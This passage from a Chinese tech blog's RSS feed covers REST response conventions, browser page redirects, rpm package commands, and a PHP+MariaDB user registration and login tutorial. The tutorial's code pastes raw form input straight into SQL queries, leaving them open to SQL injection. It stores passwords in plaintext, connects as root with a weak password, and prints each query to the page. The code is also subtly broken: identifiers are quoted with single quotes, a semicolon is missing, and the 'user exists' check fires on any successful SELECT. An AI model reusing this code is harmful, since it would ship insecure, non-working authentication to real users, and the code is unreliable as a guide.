&lt;li&gt;500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8错误处理error-handling&#34;&gt;8.错误处理（Error handling）&lt;/h2&gt;
&lt;p&gt;如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
 error: &amp;quot;Invalid API key&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9返回结果&#34;&gt;9.返回结果&lt;/h2&gt;
&lt;p&gt;针对不同操作，服务器向用户返回的结果应该符合以下规范。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET /collection：返回资源对象的列表（数组）&lt;/li&gt;
&lt;li&gt;GET /collection/resource：返回单个资源对象&lt;/li&gt;
&lt;li&gt;POST /collection：返回新生成的资源对象&lt;/li&gt;
&lt;li&gt;PUT /collection/resource：返回完整的资源对象&lt;/li&gt;
&lt;li&gt;PATCH /collection/resource：返回完整的资源对象&lt;/li&gt;
&lt;li&gt;DELETE /collection/resource：返回一个空文档&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Web开发—页面跳转</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</link>
        <pubDate>Sat, 05 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</guid>
        <description>&lt;h2 id=&#34;1页面跳转原页面跳转&#34;&gt;1.页面跳转（原页面跳转）&lt;/h2&gt;
&lt;h3 id=&#34;通过-a-标签实现&#34;&gt;通过 a 标签实现&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.baidu.com&amp;#34;&lt;/span&gt;&amp;gt;BAT&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通过-windowlocationhref-实现&#34;&gt;通过 window.location.href 实现&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.baidu.com&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2页面跳转-打开新标签页&#34;&gt;2.页面跳转 （打开新标签页）&lt;/h2&gt;
&lt;h3 id=&#34;通过-a-标签实现-1&#34;&gt;通过 a 标签实现&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.baidu.com&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_blank&amp;#34;&lt;/span&gt;&amp;gt;BAT&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通过-windowopen-实现&#34;&gt;通过 window.open() 实现&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.baidu.com&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—rpm 软件管理工具</title>
        <link>https://ac-lm.github.io/posts/linux/linuxrpm-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxrpm-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;在 Linux 操作系统下，几乎所有的软件都可以通过 rpm 进行安装、卸载及管理等操作。rpm 的全称为Redhat Package Manager ，是由Redhat 公司提出的，用于管理Linux 下软件包的软件。&lt;/p&gt;
&lt;h2 id=&#34;1安装&#34;&gt;1.安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -i example.rpm  &lt;span style=&#34;color:#75715e&#34;&gt;#安装 example.rpm 包；&lt;/span&gt;
rpm -iv example.rpm &lt;span style=&#34;color:#75715e&#34;&gt;#安装 example.rpm 包并在安装过程中显示正在安装的文件信息；&lt;/span&gt;
rpm -ivh example.rpm &lt;span style=&#34;color:#75715e&#34;&gt;#安装 example.rpm 包并在安装过程中显示正在安装的文件信息及安装进度&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2删除&#34;&gt;2.删除&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -e example  &lt;span style=&#34;color:#75715e&#34;&gt;#注意：软件包名是example，而不是rpm文件名&amp;#34;example.rpm&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3升级&#34;&gt;3.升级&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -Uvh example.rpm
&lt;span style=&#34;color:#75715e&#34;&gt;#注意：rpm会自动卸载相应软件包的老版本。如果老版本软件的配置文件与新版本的不兼容，rpm会自动将其保存为另外一个文件，用户会看到下面的信息：saving /etc/example.conf as /etc/example.conf.rpmsave，用户就可以自己手工去更改相应的配置文件&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#注意：如果用户要安装老版本的软件，会看到下面的出错信息：error:example.rpm cannot be installed，强行安装要使用-oldpackage参数。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4查询&#34;&gt;4.查询&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -qa | grep clickhouse
&lt;span style=&#34;color:#75715e&#34;&gt;#用户可以用 rpm -q 在rpm的数据库中查询相应的软件，rpm会给出软件包的名称，版本，发布版本号&lt;/span&gt;
----- 可用参数 ---------------------------------------------
-a   &lt;span style=&#34;color:#75715e&#34;&gt;#查询目前系统安装的所有软件包。&lt;/span&gt;
-f 文件名   &lt;span style=&#34;color:#75715e&#34;&gt;#查询包括该文件的软件包。&lt;/span&gt;
-F   &lt;span style=&#34;color:#75715e&#34;&gt;#同-f参数，只是输入是标准输入（例如 find /usr/bin | rpm -qF)&lt;/span&gt;
-q 软件包名   &lt;span style=&#34;color:#75715e&#34;&gt;#查询该软件包&lt;/span&gt;
-Q 　　&lt;span style=&#34;color:#75715e&#34;&gt;#同-p参数，只是输入是标准输入（例如 find /mnt/cdrom/RedHat/RPMS | rpm -qQ)&lt;/span&gt;
-i    &lt;span style=&#34;color:#75715e&#34;&gt;#显示软件包的名称，描述，发行，大小，编译日期，安装日期，开发人员等信息。&lt;/span&gt;
-l    &lt;span style=&#34;color:#75715e&#34;&gt;#显示软件包包含的文件&lt;/span&gt;
-s    &lt;span style=&#34;color:#75715e&#34;&gt;#显示软件包包含的文件目前的状态，只有两种状态：normal和missing&lt;/span&gt;
-d    &lt;span style=&#34;color:#75715e&#34;&gt;#显示软件包中的文档（如man,info,README等）&lt;/span&gt;
-c    &lt;span style=&#34;color:#75715e&#34;&gt;#显示软件包中的配置文件，这些文件一般是安装后需要用户手工修改的，例如：sendmail.cf,passwd,inittab等&lt;/span&gt;
-v    &lt;span style=&#34;color:#75715e&#34;&gt;#类似于ls -l的输出&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5校验&#34;&gt;5.校验&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -Vf 需要验证到包
rpm -Va  &lt;span style=&#34;color:#75715e&#34;&gt;#全部校验 &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—PHP&#43;MariaDB 数据库操作</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91php&#43;mariadb-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</link>
        <pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91php&#43;mariadb-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</guid>
        <description>&lt;h2 id=&#34;1连接数据库&#34;&gt;1.连接数据库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;extension_loaded&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysqli&amp;#39;&lt;/span&gt;)){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yes&amp;#39;&lt;/span&gt;;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;# 判断 mysqli 组件是否已经被加载
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;# 数据库地址，用户名，密码，表单
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;# 判断数据库是否连接
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2一个用户注册和系统登录&#34;&gt;2.一个用户注册和系统登录&lt;/h2&gt;
&lt;h3 id=&#34;a创建数据库表和用户&#34;&gt;a、创建数据库、表和用户。&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;DROP&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;DATABASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;DATABASE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;USE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;DROP&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;EXISTS&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tbl_user&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tbl_user&amp;#39;&lt;/span&gt; (
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#66d9ef&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;KEY&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;)
) &lt;span style=&#34;color:#66d9ef&#34;&gt;ENGINE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;InnoDB &lt;span style=&#34;color:#66d9ef&#34;&gt;DEFAULT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;CHARSET&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gb2312;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c注册的代码&#34;&gt;c、注册的代码：&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# register_do.php
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
    $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    $query &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from tbl_user where username = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $query;
    $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;($query);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($result){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;The user &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; exist&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;register.html&amp;#34; rel=&amp;#34;external nofollow&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Back to register&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        $query &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insert into tbl_user values (&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;, &amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $password &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;)&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $query;
        $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $db&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;($query);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($result){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;a href=&amp;#34;register.html&amp;#34; rel=&amp;#34;external nofollow&amp;#34; rel=&amp;#34;external nofollow&amp;#34; &amp;gt;Register successful&amp;lt;/a&amp;gt;&amp;#39;&lt;/span&gt;;
        }
    }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d登录的代码&#34;&gt;d、登录的代码：&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# login_do.php
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
    $username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
    $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_connect_errno&lt;/span&gt;()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connect DB error&amp;#39;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
    }
    $query &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select * from tbl_user where username = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $username &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; and password = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $password &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $query;
